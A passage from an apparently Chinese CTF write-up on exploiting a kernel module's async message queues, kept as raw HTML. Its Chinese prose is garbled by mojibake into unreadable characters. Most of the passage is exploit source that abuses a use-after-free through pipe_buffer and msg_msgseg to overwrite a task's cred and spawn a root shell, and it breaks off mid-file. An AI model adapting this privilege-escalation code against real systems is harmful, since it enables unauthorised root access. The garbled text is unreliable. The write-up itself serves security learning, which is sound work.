class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€†å‘åˆ†ææˆ‘ä»¬ä¸éš¾è·å¾— <code>u2k</code> ä¸ <code>k2u</code> é˜Ÿåˆ—ä¸­çš„ object çš„ç»“æ„ä½“å®šä¹‰ï¼š</p><blockquote><p><del>ğŸ‘´è‡ªå·±é€†åŠå¤©å¾—çš„ï¼Œæ²¡æœ‰å·å·çœ‹æºç </del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªå†…æ ¸æ¨¡å—çš„å…¨è²Œä¾¿å·²ç»å±•ç°åœ¨æˆ‘ä»¬é¢å‰äº†ï¼šç”¨æˆ·é€šè¿‡ <code>ioctl()</code> å‘è¯·æ±‚é˜Ÿåˆ— <code>u2k</code> ä¸­æ”¾å…¥è¯·æ±‚æ¶ˆæ¯ï¼ˆæ¯æ¡æ¶ˆæ¯é™„å¸¦ä¸€ä¸ª headerï¼‰ï¼Œå†…æ ¸çº¿ç¨‹å¼‚æ­¥åœ°ä» <code>u2k</code> é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯ï¼Œæ ¹æ®å…¶ç±»å‹è¿›è¡Œå¤„ç†ï¼Œå®Œæˆä¹‹åå°†ç»“æœæ”¾å› <code>k2u</code> é˜Ÿåˆ—ï¼Œç”±ç”¨æˆ·è¿›è¡Œå¼‚æ­¥è¯»å–ï¼›å¯¹äºè¯·æ±‚ä¸å“åº”æ¶ˆæ¯é•¿åº¦ç›¸åŒçš„ï¼Œå†…æ ¸ä¼šå¤ç”¨ç›¸åº”çš„ objectï¼Œå¦åˆ™ä¼šåˆ†é…æ–°çš„ object ä½œä¸ºè¿”å›ç»“æœå¹¶é‡Šæ”¾å‚¨å­˜åŸæœ‰è¯·æ±‚ä¿¡æ¯çš„ object</p><p>ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´è¿™é“é¢˜å…¶å®æ²¡æœ‰å®Œå…¨å®Œæˆï¼Œç¬”è€…åŸæœ¬æƒ³è¦å†™ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·ä¸å†…æ ¸é—´çš„  <em>å¼‚æ­¥é€šä¿¡æ¶ˆæ¯å¤„ç†æ¡†æ¶</em>  ï¼Œä½†æ˜¯æœ€ååªå®Œæˆäº†å¼‚æ­¥é€šä¿¡é˜Ÿåˆ—ï¼Œæ²¡æœ‰å®ŒæˆåŸºäºå†…å­˜å…±äº«çš„çŠ¶æ€æŸ¥è¯¢éƒ¨åˆ†ï¼Œä¸è¿‡æˆ‘ä»¬ä»èƒ½é€šè¿‡ <code>ioctl()</code> ç›´æ¥è¯»å–çš„æ–¹å¼å®Œæˆè½®è¯¢ï¼Œå°±æ˜¯å¼€é”€å·¨å¤§ï¼šï¼‰</p><h2 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åˆ©ç”¨ UAF å°† <code>pipe_buffer</code> å’Œ <code>msg_msgseg</code> åˆ†é…åˆ°ä¸€èµ·ï¼Œè¯»å†™ pipe ä½¿å¾—å…¶ä½¿ç”¨ <code>pipe_buffer[1]</code> ä»¥é¿å… <code>msg_msgseg</code> å¼€å¤´çš„ NULL å¹²æ‰°ï¼Œä¹‹åä¸æ–­é‡åˆ†é… <code>msg_msgseg</code> è¿›è¡Œå†…å­˜æœç´¢æ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> å¹¶å°† <code>task_struct-&gt;cred</code> æ”¹ä¸º <code>init_cred</code> å³å¯å®Œæˆææƒ</p><p>è¿™é‡Œæ²¡æœ‰é€‰æ‹©å°†ä¸¤ä¸ª <code>pipe_buffer</code> åˆ†é…åˆ°åŒä¸€ä¸ª object çš„æ–¹å¼æ˜¯å› ä¸º<strong>é¢˜ç›®å¼€å¯äº†</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>ï¼Œæ‰€æœ‰çš„å†…æ ¸å¯¹è±¡åœ¨é‡Šæ”¾åéƒ½ä¼šè¢«æ¸…é›¶</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾ç›´æ¥æ„é€ å‡º page-level UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 